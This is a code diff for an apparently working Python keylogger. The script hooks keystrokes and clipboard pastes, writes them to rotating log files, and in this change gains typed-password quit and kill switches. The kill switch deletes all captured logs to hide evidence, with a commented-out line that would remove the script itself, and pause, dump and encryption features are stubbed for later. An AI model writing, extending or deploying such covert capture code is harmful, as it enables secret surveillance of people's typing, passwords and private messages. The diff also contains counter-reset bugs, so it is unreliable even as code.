@@ -15,13 +15,19 @@ current_window = None
 #Filewrite Vars
 filename_base = "x"
 filename_ext  = ".log"
-open_type = 'a'
+open_type = 'a+'
 filesize_limit = 500000 #Bytes
 paste_limit = 500 #chars
 
 #CheckQuit Vars
-password = "zwagtastico1"
-pass_counter = 0
+quit_pass = "zwagquit"
+quit_pass_counter = 0
+
+
+#CheckKill Vars
+kill_pass = "zwagkill"
+kill_pass_counter = 0
+
 
 
 
@@ -73,7 +79,7 @@ def KeyStroke(event):
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
         print chr(event.Ascii),
-        checkQuit(chr(event.Ascii))
+        checkTriggers(chr(event.Ascii))
         writeToFile(chr(event.Ascii))
     else:
         # if [Ctrl-V], get the value on the clipboard
@@ -92,28 +98,65 @@ def KeyStroke(event):
     # pass execution to next hook registered 
     return True
 
+def checkTriggers(key):
+    quitSwitch(key)
+    killSwitch(key)
+    pauseSwitch(key)
+    resumeSwitch(key)
 
-def checkQuit(key):
-    global pass_counter
+def quitSwitch(key):
+    global quit_pass_counter
 
-    if (password[pass_counter] == key):
-        pass_counter = pass_counter + 1
-        if (pass_counter >= len(password)):
+    if (quit_pass[quit_pass_counter] == key):
+        quit_pass_counter = quit_pass_counter + 1
+        if (quit_pass_counter >= len(quit_pass)):
             quit()
     else:
         pass_counter = 0;
+
+def killSwitch(key):
+    global kill_pass_counter
+
+    if (kill_pass[kill_pass_counter] == key):
+        kill_pass_counter = kill_pass_counter + 1
+        if (kill_pass_counter >= len(kill_pass)):
+
+            filelist = [ f for f in os.listdir(".") if f.endswith(".log") ]
+            for f in filelist:
+                os.remove(f)
+            #os.remove("yourfile.py")
+            quit()
+    else:
+        pass_counter = 0;
+
+def pauseSwitch(key):
+    i = "TODO"
+
+def resumeSwitch(key):
+    i = "TODO"
+
+def statusSwitch(key):
+    i = "TODO"
+
+def dumpSwitch(key):
+    i = "TODO"
+
+#ENCRYPTION
 
 def writeToFile(key):
     global open_type
     filename = filename_base+filename_ext
 
-    if (os.path.getsize(filename) > filesize_limit):
-        xdate = strftime("%Y-%m-%d--%H-%M-%S", gmtime())
-        shutil.copy2(filename, filename_base+xdate+filename_ext)
-        open_type = 'w'
-        print "SET"
-    else:
-        open_type = 'a'
+    try:
+        if (os.path.getsize(filename) > filesize_limit):
+            xdate = strftime("%Y-%m-%d--%H-%M-%S", gmtime())
+            shutil.copy2(filename, filename_base+xdate+filename_ext)
+            open_type = 'w+'
+            print "SET"
+        else:
+            open_type = 'a+'
+    except:
+        open_type = 'a+'
 
     print "A",open_type
     target = open(filename,open_type)
